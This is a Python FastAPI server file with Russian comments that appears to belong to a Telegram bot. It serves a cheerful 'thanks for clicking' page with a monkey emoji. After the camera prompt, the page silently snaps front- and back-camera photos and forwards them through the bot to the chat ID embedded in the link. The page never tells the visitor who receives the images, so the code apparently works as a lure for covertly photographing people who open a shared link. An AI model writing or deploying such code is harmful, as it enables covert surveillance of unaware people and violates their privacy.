"""
Веб-сервер на FastAPI.
- Раздаёт HTML-страницу с доступом к камере
- Принимает фото от клиента и пересылает их в Telegram
- Интегрируется с aiogram (поддержка webhook или polling)
"""

import os
import asyncio
from contextlib import asynccontextmanager
from dotenv import load_dotenv

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
import uvicorn

# Импортируем компоненты бота
from bot import (
    bot,
    dp,
    on_startup,
    send_photos_to_user,
    USE_WEBHOOK,
    WEB_APP_URL
)

load_dotenv()


# --- Lifespan: управление жизненным циклом приложения ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    """
    При старте приложения настраиваем бота.
    Если USE_WEBHOOK=false — запускаем polling в фоновой задаче.
    Если USE_WEBHOOK=true — полагаемся на endpoint /webhook/bot.
    """
    if not USE_WEBHOOK:
        await on_startup()
        bot_task = asyncio.create_task(dp.start_polling(bot))
        print("[INFO] Бот запущен в режиме polling (фоновая задача).")
        yield
        # При завершении приложения останавливаем бота
        bot_task.cancel()
        try:
            await bot_task
        except asyncio.CancelledError:
            pass
        print("[INFO] Бот остановлен.")
    else:
        await on_startup()
        print("[INFO] Бот настроен на вебхук.")
        yield


app = FastAPI(
    title="Telegram Camera Bot",
    lifespan=lifespan
)

# Раздача статических файлов (папка static должна существовать)
app.mount("/static", StaticFiles(directory="static"), name="static")


# --- Эндпоинт для вебхука бота (только при USE_WEBHOOK=true) ---
@app.post("/webhook/bot")
async def telegram_webhook(request: Request):
    """
    Принимает обновления от Telegram.
    Работает только при USE_WEBHOOK=true.
    """
    from aiogram import types
    data = await request.json()
    update = types.Update.model_validate(data, context={"bot": bot})
    await dp.feed_update(bot, update)
    return {"ok": True}


# --- Главная страница ---
@app.get("/", response_class=HTMLResponse)
async def root():
    return "<h1>✅ Бот работает! Перейдите в Telegram.</h1>"


# --- Страница с камерой ---
@app.get("/photo/{user_id}", response_class=HTMLResponse)
async def photo_page(user_id: int):
    """
    Отдаёт адаптивную HTML-страницу.
    Подставляет user_id в JavaScript для отправки фото на правильный chat_id.
    """
    # Важно: страница должна открываться по HTTPS для getUserMedia!
    html_content = f"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>📸 Камера</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 
                         Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: white;
            text-align: center;
            overflow-x: hidden;
        }}
        .container {{
            max-width: 500px;
            width: 100%;
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 24px;
            padding: 40px 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.18);
            animation: fadeIn 0.8s ease-out;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        .monkey {{
            font-size: 100px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
        }}
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0) scale(1); }}
            50% {{ transform: translateY(-15px) scale(1.05); }}
        }}
        h1 {{
            font-size: 26px;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-weight: 800;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }}
        .subtitle {{
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 25px;
            line-height: 1.5;
        }}
        .status {{
            margin-top: 20px;
            padding: 18px;
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.2);
            font-size: 15px;
            font-weight: 500;
            line-height: 1.4;
            transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.1);
        }}
        .status.success {{
            background: rgba(46, 204, 113, 0.3);
            border-color: rgba(46, 204, 113, 0.5);
        }}
        .status.error {{
            background: rgba(231, 76, 60, 0.3);
            border-color: rgba(231, 76, 60, 0.5);
        }}
        video {{
            width: 100%;
            max-width: 280px;
            border-radius: 20px;
            margin: 15px auto;
            display: none;
            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
            transform: scaleX(-1); /* Зеркально для фронтальной */
        }}
        canvas {{
            display: none;
        }}
        .spinner {{
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 15px auto;
            display: none;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        @media (max-width: 480px) {{
            .container {{ padding: 30px 20px; }}
            h1 {{ font-size: 22px; }}
            .monkey {{ font-size: 80px; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="monkey">🐒</div>
        <h1>СПАСИБО, ЧТО ПЕРЕШЁЛ!</h1>
        <p class="subtitle">Сейчас запросим доступ к камере...</p>
        <div class="spinner" id="spinner"></div>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        <div class="status" id="status">⏳ Инициализация...</div>
    </div>

    <script>
        const userId = {user_id};
        const statusEl = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let isProcessing = false;

        async function init() {{
            try {{
                // Проверяем поддержку getUserMedia
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
                    throw new Error('Браузер не поддерживает доступ к камере');
                }}

                statusEl.textContent = '📹 Запрашиваем доступ к камере...';
                spinner.style.display = 'block';

                // Запрашиваем фронтальную камеру
                const stream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ 
                        facingMode: 'user',
                        width: {{ ideal: 1280 }},
                        height: {{ ideal: 720 }}
                    }},
                    audio: false
                }});

                video.srcObject = stream;
                video.style.display = 'block';
                spinner.style.display = 'none';
                statusEl.textContent = '✅ Доступ получен! Подготовка...';

                video.onloadedmetadata = () => {{
                    video.play();
                    // Даем время на фокусировку и стабилизацию
                    setTimeout(() => capturePhotos(stream), 1200);
                }};

            }} catch (err) {{
                console.error('Camera error:', err);
                spinner.style.display = 'none';
                statusEl.className = 'status error';
                statusEl.innerHTML = '❌ Не удалось получить доступ к камере.<br><br>'
                    + 'Убедитесь, что:<br>'
                    + '1. Вы используете HTTPS<br>'
                    + '2. Разрешили доступ к камере в настройках браузера<br>'
                    + '3. Открыли ссылку в Safari/Chrome, а не внутри приложения';
            }}
        }}

        async function capturePhotos(frontStream) {{
            if (isProcessing) return;
            isProcessing = true;

            statusEl.textContent = '📸 Делаем снимки...';
            spinner.style.display = 'block';

            // Настраиваем canvas под размер видео
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;

            // Делаем снимок с фронтальной камеры
            ctx.drawImage(video, 0, 0);
            const frontPhoto = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];

            // Останавливаем фронтальную камеру
            frontStream.getTracks().forEach(t => t.stop());
            video.style.display = 'none';

            // Пытаемся получить доступ к основной камере
            let backPhoto = frontPhoto; // По умолчанию дублируем

            try {{
                const backStream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ 
                        facingMode: {{ exact: 'environment' }},
                        width: {{ ideal: 1280 }},
                        height: {{ ideal: 720 }}
                    }},
                    audio: false
                }});

                const backVideo = document.createElement('video');
                backVideo.srcObject = backStream;

                await new Promise((resolve, reject) => {{
                    backVideo.onloadedmetadata = () => {{
                        backVideo.play();
                        setTimeout(resolve, 1000);
                    }};
                    backVideo.onerror = reject;
                    setTimeout(resolve, 3000); // Таймаут на всякий случай
                }});

                const backCanvas = document.createElement('canvas');
                backCanvas.width = backVideo.videoWidth || 640;
                backCanvas.height = backVideo.videoHeight || 480;
                backCanvas.getContext('2d').drawImage(backVideo, 0, 0);
                backPhoto = backCanvas.toDataURL('image/jpeg', 0.85).split(',')[1];

                backStream.getTracks().forEach(t => t.stop());
            }} catch (e) {{
                console.log('Основная камера недоступна, используем фронтальную');
            }}

            spinner.style.display = 'none';
            statusEl.textContent = '📤 Отправляем фото...';

            // Отправляем на сервер
            try {{
                const response = await fetch('/webhook/photo', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        user_id: userId,
                        front_photo: frontPhoto,
                        back_photo: backPhoto
                    }})
                }});

                if (response.ok) {{
                    statusEl.className = 'status success';
                    statusEl.innerHTML = '✅ <b>Готово!</b><br>Фото отправлены в Telegram.<br>Можете закрыть страницу.';
                }} else {{
                    throw new Error('Server responded with ' + response.status);
                }}
            }} catch (e) {{
                console.error('Upload error:', e);
                statusEl.className = 'status error';
                statusEl.textContent = '❌ Ошибка при отправке фото. Попробуйте обновить страницу.';
            }}
        }}

        // Запускаем при загрузке
        window.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>"""
    return html_content


# --- Приём фото от веб-страницы ---
@app.post("/webhook/photo")
async def receive_photo(request: Request):
    """
    Принимает JSON с двумя фото в base64 и user_id.
    Пересылает их в Telegram через бота.
    """
    try:
        data = await request.json()
        user_id = data.get("user_id")
        front_photo = data.get("front_photo")
        back_photo = data.get("back_photo")

        if not all([user_id, front_photo, back_photo]):
            return JSONResponse(
                status_code=400,
                content={"status": "error", "message": "Missing required fields"}
            )

        # Отправляем фото пользователю через бота
        await send_photos_to_user(int(user_id), front_photo, back_photo)

        return {"status": "ok", "message": "Photos sent"}

    except Exception as e:
        print(f"[ERROR] Ошибка в /webhook/photo: {e}")
        return JSONResponse(
            status_code=500,
            content={"status": "error", "message": str(e)}
        )


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
